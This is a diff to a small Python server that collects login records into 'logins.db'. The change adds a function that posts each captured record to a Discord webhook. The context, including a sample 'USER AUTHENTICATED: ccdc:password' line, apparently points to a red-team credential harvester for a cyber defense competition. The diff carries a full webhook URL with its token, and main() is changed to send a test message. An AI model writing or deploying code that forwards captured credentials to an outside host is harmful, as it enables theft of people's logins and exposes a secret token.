@@ -1,8 +1,23 @@
 import socket
 import sqlite3
+import requests
 import threading
 
 PORT = 5000
+WEBHOOK_URL = "https://discord.com/api/webhooks/1344473763550461972/JGeTQsADKvDzdl-fn6MmNgHIJ_xPz05CHxone7_8Eq6iaI3WqfCWTSowFse4QE6du8B5"
+
+def send_discord(addr, data):
+    hook_data = {
+        'content': data,
+        'username': 'kms bot',
+        'avatar_url': 'https://cdn.discordapp.com/emojis/1203535228975448094.webp',
+        'embeds': [{
+            'description': "type shit",
+            'color': 15258703
+        }]
+    }
+
+    response = requests.post(WEBHOOK_URL, json=hook_data)
 
 def write_db(addr, data):
     conn = sqlite3.connect('logins.db')
@@ -69,24 +84,26 @@ def handle_client(lock, c, addr):
 
     lock.acquire()
     write_db(addr, data)
+    send_discord(addr, data)
     lock.release()
 
     c.close()
 
 def main():
-    server_socket = socket.socket()
-    print("Created socket")
+    send_discord("a", "a")
+    # server_socket = socket.socket()
+    # print("Created socket")
 
-    server_socket.bind(('', PORT))
-    server_socket.listen()
-    print(f"Server listening for incoming connections on port {PORT}...")
+    # server_socket.bind(('', PORT))
+    # server_socket.listen()
+    # print(f"Server listening for incoming connections on port {PORT}...")
 
-    lock = threading.Lock()
+    # lock = threading.Lock()
 
-    while True:
-        client_socket, addr = server_socket.accept()
-        client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr))
-        client_thread.start()
+    # while True:
+    #     client_socket, addr = server_socket.accept()
+    #     client_thread = threading.Thread(target=handle_client, args=(lock,client_socket,addr))
+    #     client_thread.start()
 
 # def main():
 #     write_db(('10.0.10.208', '21314'), "10.0.10.208 - USER AUTHENTICATED: ccdc:password")
